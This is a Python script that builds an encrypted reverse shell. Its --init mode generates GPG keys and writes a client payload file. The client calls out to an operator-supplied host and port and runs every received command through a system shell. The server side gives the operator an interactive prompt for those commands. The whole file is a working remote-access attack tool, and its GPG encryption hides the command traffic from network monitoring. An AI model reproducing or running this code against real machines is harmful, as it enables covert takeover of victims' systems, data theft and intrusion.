from os import times
import socket
import sys
import gnupg
import sys

gpg = gnupg.GPG()
gpg.encoding = 'utf-8'

if "--init" in sys.argv:
    HOST = input("Enter host (ip or domain) : ")
    PORT = input("Enter port number : ")

    gen_input = """
Key-Type: eddsa
Key-Curve: ed25519
Subkey-Type: ecdh
Subkey-Curve: cv25519
Name-Real: Server
Name-Email: server@example.com
%no-protection
%commit""" 

    key = gpg.gen_key(gen_input) # GenKey
    exported_public_key = gpg.export_keys(key.fingerprint)

    client_script_txt = f'''import socket
from subprocess import Popen, PIPE, STDOUT
import sys
import os
import gnupg

def send_cipher(msg):
    ciphertext = gpg.encrypt(msg, server_key, always_trust=True)
    sock.send(ciphertext.data)

def recv_cipher():
    ciphertext = sock.recv(BUFFER_SIZE)
    plaintext = gpg.decrypt(ciphertext.decode())
    return plaintext.data.decode()

HOST = "{HOST}"
PORT = {PORT}
BUFFER_SIZE = 4096

gpg = gnupg.GPG()
gpg.encoding = "utf-8"

server_key_pem = """{exported_public_key}
"""

gen_input = """
Key-Type: eddsa
Key-Curve: ed25519
Subkey-Type: ecdh
Subkey-Curve: cv25519
Name-Real: Snake
Name-Email: snake@example.com
%no-protection
%commit
"""

import_result = gpg.import_keys(server_key_pem)
server_key: str = import_result.fingerprints[0]

key = gpg.gen_key(gen_input) # GenKey

exported_public_key = gpg.export_keys(key.fingerprint)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Initiating Connection...")

try:
    sock.connect((HOST, PORT))
except:
    print("Couldn't connect to server, exiting...")
    sys.exit()

print("Connection estabilished with Sucess!")

sock.send(os.getcwd().encode())

res = sock.recv(BUFFER_SIZE).decode()
if res != "ok":
    print("Conection refused by server, exiting...")
    sys.exit()

sock.send(exported_public_key.encode())

# Looping on commands
while True:
    command = recv_cipher()

    if command == "exit":
        print("Exiting...")
        sock.close()
        break
                    
    # Navegate into directories
    if command.startswith("cd"):
        try:
            os.chdir(command[3:])
        except Exception as e:
            send_cipher(str(e))
            continue
        send_cipher(os.getcwd())
        continue

    command_output = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)

    send_cipher(command_output.stdout.read().decode())'''

    with open("reverseshell-client.py", "w") as f:
        f.write(client_script_txt)

    print("Payload created at : ./reverseshell-client.py")
    sys.exit()


def send_cipher(msg):
    ciphertext = gpg.encrypt(msg, client_key, always_trust=True)
    client.send(ciphertext.data)

def recv_cipher():
    ciphertext = client.recv(BUFFER_SIZE)
    plaintext = gpg.decrypt(ciphertext.decode())
    return plaintext.data.decode()

HOST = "0.0.0.0"
PORT = int(input("Enter port number : "))
BUFFER_SIZE = 4096

print("Loading private key...")
public_key = None
public_keys = gpg.list_keys()
for key in public_keys:
    if key["uids"][0] == "Server <server@example.com>":
        public_key = key

if public_key == None:
    print("Error: Server keys has not been initiated, please run the following command :\nreverseshell-server.py --init")
    sys.exit()

public_key_pem = gpg.export_keys(public_key["keyid"])

print(f"--> Server Started on {HOST}!")
print("--> Listening For Client Connection...")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))

server.listen(1)

print("Waiting for connection...")
while True:
    client, client_ip = server.accept()
    print(f"Connection from {client_ip}")

    pwd = client.recv(BUFFER_SIZE).decode()

    client.send(b"ok")

    client_key = gpg.import_keys(client.recv(BUFFER_SIZE).decode())
    client_key = client_key.fingerprints[0]

    while True:           
        message_command = input(f'Pwd: {pwd} > ')
      
        # Exiting keyword
        if message_command == "exit":
            print("Closing...")
            send_cipher("exit")
            client.close()
            server.close()
            sys.exit()

        if message_command.startswith("cd"):
            send_cipher(message_command.encode())
            res = recv_cipher()
            if res.startswith("[Errno"):
                print(res)
            else:
                pwd = res
            continue

        if message_command == "":
            print("Missing command!")
            continue
        
        send_cipher(message_command.encode())

        receive_message = recv_cipher()
        
        print(receive_message)